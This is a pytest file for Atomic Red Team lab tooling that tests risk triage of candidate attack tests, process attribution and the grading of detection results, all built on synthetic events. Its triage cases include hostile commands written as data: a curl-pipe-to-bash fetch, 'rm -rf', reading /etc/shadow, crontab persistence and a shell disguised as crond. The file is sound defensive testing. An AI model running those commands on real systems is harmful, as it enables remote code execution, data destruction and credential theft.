"""Atomic Red Team lab tooling: risk triage, attribution and result grading.

Engine databases here are built with the real pipeline from synthetic events; no Atomic
test is executed.
"""

import json
import sys
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from runtime_engine.detection.rule_loader import load_rules
from runtime_engine.events.schema import Event
from runtime_engine.pipeline import Pipeline
from runtime_engine.storage.database import Database

SCRIPTS = Path(__file__).resolve().parents[2] / "testing" / "atomic-red-team" / "scripts"
sys.path.insert(0, str(SCRIPTS))

import atomic_report  # noqa: E402
import catalog  # noqa: E402

BOOT = "lab-boot"
START = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)
RUNNER = atomic_report.process_key(BOOT, 500, "5000")


def atomic(command: str, **overrides: object) -> catalog.AtomicTest:
    values: dict[str, object] = dict(
        technique="T1082",
        technique_name="System Information Discovery",
        number=1,
        name="test",
        guid="g",
        description="d",
        platforms=["linux"],
        executor="sh",
        elevation_required=False,
        command=command,
        cleanup="",
        dependencies=[],
        input_arguments={},
    )
    values.update(overrides)
    test = catalog.AtomicTest(**values)  # type: ignore[arg-type]
    catalog.classify(test)
    catalog.engine_view(test)
    return test


@pytest.mark.parametrize(
    "command,overrides,risk",
    [
        ("uname -srm", {}, "A"),
        ("users\nw\nwho", {}, "A"),
        ("for i in $(seq 1 5); do echo hi; sleep 1; done", {}, "A"),
        ("cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond", {"cleanup": "rm /tmp/crond"}, "B"),
        ("env", {}, "B"),
        ("busybox sh &", {}, "B"),
        ("lsmod", {"elevation_required": True}, "B"),
        ("hostname", {"dependencies": [{"get_prereq_command": "true"}]}, "B"),
        ("curl -s https://example.org | bash", {}, "C"),
        ("echo x | PERL_MM_USE_DEFAULT=1 cpan", {}, "C"),
        ("rm -rf ~/x", {}, "C"),
        ("cat /etc/shadow", {}, "C"),
        ("echo '* * * * * id' | crontab -", {}, "C"),
        ("hostname", {"technique": "T1053.003"}, "C"),
        ("ls", {"dependencies": [{"get_prereq_command": "sudo apt-get install -y x"}]}, "C"),
    ],
)
def test_risk_triage(command, overrides, risk):
    test = atomic(command, **overrides)
    assert test.risk == risk, test.reasons
    assert test.reasons


def test_engine_view_and_programs():
    masquerade = atomic("cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond")
    assert "RT002 (exec from temp path, live)" in masquerade.engine_rules
    assert "likely observed" in masquerade.observable
    assert "file writes: not collected live" in masquerade.observable
    assert catalog.programs('for i in $(seq 1 5); do echo "$i x"; sleep 1; done') == [
        "seq",
        "sleep",
    ]
    assert catalog.programs("if [ -d /etc/init.d ]; then ls -l /etc/init.d; fi") == ["ls"]
    assert "short-lived" in atomic("uname -srm").observable
    assert atomic("kldstat-not-installed-anywhere").suitable.startswith("no: not installed")
    assert catalog.render("echo #{x}", {"x": {"default": "1"}}) == "echo 1"


@pytest.mark.skipif(not catalog.DEFAULT_ATOMICS.is_dir(), reason="atomics folder not installed")
def test_real_catalog_candidates():
    tests = {t.guid: t for t in catalog.load(catalog.DEFAULT_ATOMICS)}
    assert tests["a315bfff-7a98-403b-b442-2ea1b255e556"].risk == "B"
    assert tests["b04ed73c-7d43-4dc8-b563-a2fc595cba1a"].risk == "A"
    assert tests["2a9b677d-a230-44f4-ad86-782df1ef108c"].risk == "A"
    assert all(t.risk == "C" for t in tests.values() if t.technique.startswith("T1003"))


def event(
    pid: int,
    start: str,
    *,
    seconds: float,
    ppid: int | None = None,
    parent_start: str | None = None,
    name: str = "proc",
    exe: str = "/usr/bin/x",
) -> Event:
    return Event(
        event_id=f"e-{pid}-{start}",
        timestamp=START + timedelta(seconds=seconds),
        event_type="PROCESS_START",
        pid=pid,
        ppid=ppid,
        parent_start_time=parent_start,
        process_name=name,
        executable_path=exe,
        process_start_time=start,
        host_id=BOOT,
        source="proc",
    )


@pytest.fixture
def lab_db(tmp_path):
    """Runner pwsh > sh > crond(/tmp/crond) plus an unrelated /tmp process in the window."""
    path = tmp_path / "engine.db"
    database = Database(path)
    pipeline = Pipeline(database, load_rules())
    for item in [
        event(500, "5000", seconds=-60, ppid=1, name="pwsh", exe="/opt/pwsh"),
        event(
            600, "6000", seconds=2, ppid=500, parent_start="5000", name="sh", exe="/usr/bin/dash"
        ),
        event(
            601, "6001", seconds=2, ppid=600, parent_start="6000", name="crond", exe="/tmp/crond"
        ),
        event(700, "7000", seconds=2, ppid=1, parent_start="1", name="other", exe="/tmp/other"),
        event(800, "8000", seconds=-30, ppid=500, parent_start="5000", name="python"),
    ]:
        pipeline.process(item)
    database.close()
    return path


def record(**overrides: object) -> dict[str, object]:
    values: dict[str, object] = {
        "run_id": "r1",
        "guid": "guid-1",
        "test_name": "Masquerading",
        "technique": "T1036.003",
        "start_utc": START.isoformat(),
        "end_utc": (START + timedelta(seconds=6)).isoformat(),
        "runner": {"pid": 500, "key": RUNNER},
        "execution": {"status": "COMPLETED", "exit_code": 0, "executor_pid": None},
        "cleanup": {"status": "COMPLETED", "verification": "PASS"},
        "engine": {"active_for_window": True, "poll_interval_seconds": 2, "session_id": "S"},
    }
    values.update(overrides)
    return values


def profile(rules: list[str], keys: list[str], telemetry: tuple[str, ...] = ("PROCESS_START",)):
    return {
        "guid-1": {"key_processes": keys, "expected_rules": rules, "telemetry": list(telemetry)}
    }


def test_attribution_uses_identity_chain_and_ignores_unrelated(lab_db):
    report = atomic_report.build_report(record(), lab_db, profile(["RT002"], ["crond"]))
    names = [p["name"] for p in report["evidence"]["processes"]]
    assert names == ["sh", "crond"]
    assert report["evidence"]["processes"][1]["ancestry"] == "runner pwsh > sh(600) > crond(601)"
    assert report["counts"]["unattributed_events_in_window"] == 1  # "other", despite its RT002
    assert [a["rule_id"] for a in report["evidence"]["alerts"]] == ["RT002"]
    assert report["evidence"]["incident_ids"] == ["INC-0001"]
    assert report["result"] == "DETECTED"
    text = atomic_report.text(report)
    assert "DETECTION RESULT:  DETECTED" in text and "INCIDENT INC-0001" in text


@pytest.mark.parametrize(
    "changes,expectations,result",
    [
        ({}, profile(["RT002", "RT005"], ["crond"]), "PARTIALLY DETECTED"),
        ({}, profile([], ["sh"]), "PARTIALLY DETECTED"),
        ({}, profile(["RT002"], ["crond"], ("PROCESS_START", "FILE_ACCESS")), "INCONCLUSIVE"),
        ({}, {}, "INCONCLUSIVE"),
        (
            {"execution": {"status": "FAILED", "exit_code": 1}},
            profile(["RT002"], ["crond"]),
            "INCONCLUSIVE",
        ),
        ({"execution": {"status": "NOT_EXECUTED"}}, profile(["RT002"], ["crond"]), "INCONCLUSIVE"),
        (
            {"engine": {"active_for_window": False, "poll_interval_seconds": 2}},
            profile(["RT002"], ["crond"]),
            "INCONCLUSIVE",
        ),
        (
            {
                "start_utc": (START + timedelta(seconds=30)).isoformat(),
                "end_utc": (START + timedelta(seconds=31)).isoformat(),
            },
            profile(["RT002"], ["crond"]),
            "INCONCLUSIVE",
        ),
    ],
)
def test_grading_rules(lab_db, changes, expectations, result):
    report = atomic_report.build_report(record(**changes), lab_db, expectations)
    assert report["result"] == result, report["result_reasons"]


def test_not_detected_requires_observed_telemetry(lab_db, tmp_path):
    database = Database(tmp_path / "plain.db")
    pipeline = Pipeline(database, load_rules())
    pipeline.process(event(500, "5000", seconds=-60, name="pwsh"))
    pipeline.process(event(600, "6000", seconds=2, ppid=500, parent_start="5000", name="sh"))
    database.close()
    observed = atomic_report.build_report(record(), tmp_path / "plain.db", profile([], ["sh"]))
    assert observed["result"] == "NOT DETECTED"
    assert "rule coverage gap" in observed["result_reasons"][0]
    expected_rule = atomic_report.build_report(
        record(), tmp_path / "plain.db", profile(["RT002"], ["sh"])
    )
    assert expected_rule["result"] == "NOT DETECTED"
    missed = atomic_report.build_report(record(), tmp_path / "plain.db", profile([], ["who"]))
    assert missed["result"] == "INCONCLUSIVE"


def test_executor_pid_attribution_is_labelled_weaker(lab_db):
    changed = record(
        runner={"pid": 1, "key": atomic_report.process_key(BOOT, 1, "1")},
        execution={"status": "COMPLETED", "exit_code": 0, "executor_pid": 600},
    )
    report = atomic_report.build_report(changed, lab_db, {})
    attributions = {p["name"]: p["attribution"] for p in report["evidence"]["processes"]}
    assert attributions["sh"] == "executor PID (weaker)"
    assert attributions["crond"] == "executor PID (weaker)"


def test_engine_status_identity_and_logs(tmp_path):
    proc = tmp_path / "proc"
    (proc / "sys/kernel/random").mkdir(parents=True)
    (proc / "sys/kernel/random/boot_id").write_text(BOOT + "\n")
    (proc / "42").mkdir()
    (proc / "42/stat").write_text("42 (py thon) S 1 " + " ".join(["0"] * 17) + " 4242 0")
    (proc / "42/cmdline").write_bytes(b"python\0-m\0runtime_engine.main\0monitor\0")
    assert atomic_report.identity(42, proc)["key"] == atomic_report.process_key(BOOT, 42, "4242")
    db = tmp_path / "engine.db"
    assert not atomic_report.engine_status(db, proc)["running"]
    database = Database(db)
    summary = {
        "session_id": "S1",
        "started_at": START.isoformat(),
        "status": "RUNNING",
        "mode": "LIVE",
        "engine_pid": 42,
        "configuration": {"poll_interval_seconds": 2},
    }
    database.save_session(summary)
    database.save_session(summary | {"session_id": "S0", "engine_pid": 43})
    database.close()
    status = atomic_report.engine_status(db, proc)
    assert status["running"] and status["session_id"] == "S1"
    (proc / "42/cmdline").write_bytes(b"vim\0")
    assert not atomic_report.engine_status(db, proc)["running"]
    log = tmp_path / "log.csv"
    log.write_text('"ProcessId","ExitCode"\n"321","0"\n', encoding="utf-8")
    assert atomic_report.executor_from_log(str(log)) == (321, 0)
    assert atomic_report.executor_from_log(None) == (None, None)


def test_report_cli_writes_private_files(lab_db, tmp_path, capsys):
    path = tmp_path / "record.json"
    path.write_text(json.dumps(record()), encoding="utf-8")
    expectations = tmp_path / "exp.yaml"
    expectations.write_text(
        "guid-1: {key_processes: [crond], expected_rules: [RT002], telemetry: [PROCESS_START]}\n"
    )
    out = tmp_path / "out"
    code = atomic_report.main(
        [
            "report",
            "--record",
            str(path),
            "--db",
            str(lab_db),
            "--expectations",
            str(expectations),
            "--out",
            str(out),
        ]
    )
    assert code == 0
    assert "DETECTED" in capsys.readouterr().out
    assert json.loads((out / "report.json").read_text())["result"] == "DETECTED"
    assert oct((out / "report.txt").stat().st_mode & 0o777) == "0o600"
    assert (
        atomic_report.main(["report", "--record", str(path), "--db", str(tmp_path / "x.db")]) == 1
    )
